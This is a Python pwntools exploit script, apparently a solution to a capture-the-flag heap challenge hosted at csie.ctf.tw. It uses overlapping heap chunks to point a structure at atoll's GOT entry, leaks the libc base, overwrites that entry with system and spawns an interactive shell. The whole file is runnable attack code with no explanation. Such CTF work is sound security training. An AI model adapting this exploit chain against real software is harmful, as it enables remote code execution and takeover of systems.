#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("./libc.so.6")

r = remote("csie.ctf.tw", 10143)
#r = process("./shik_in_the_heap", env = {"LD_PRELOAD": "./libc.so.6"})
#gdb.attach(proc.pidof(r)[0])

def allocate(size, data):
    print("allocate", size, data)
    r.sendlineafter(':', "1")
    r.sendlineafter(':', str(size))
    r.sendlineafter(':', data)

def free(index):
    print("free", index)
    r.sendlineafter(':', "2")
    r.sendlineafter(':', str(index))

def add_shik(magic):
    print("add shik", magic)
    r.sendlineafter(':', "3")
    r.sendlineafter(':', magic)

def show_shik():
    print("show shik")
    r.sendlineafter(':', "4")

def edit_shik(magic):
    print("edit shik", magic)
    r.sendlineafter(':', "5")
    r.sendlineafter(':', magic)

atoll_got = 0x602058

allocate(0x30, "jedi")
allocate(0x160, b'A' * 0xf0 + p64(0x100))
allocate(0xf0, "jedi")

free(1)
free(0)
allocate(0x38, 'A' * 0x38)
allocate(0x80, "jedi")
add_shik("jedi")
free(1)
free(2)
allocate(0x200, b'A' * 0x90 + p64(atoll_got))

show_shik()
r.recvuntil("Magic: ")
libc.address = u64(r.recvuntil(b'#')[:-1].ljust(8, b'\x00')) - 0x36eb0
print("libc address:", hex(libc.address))

edit_shik(p64(libc.symbols[b"system"]))

r.recvuntil(':')
r.sendline("sh")

r.interactive()
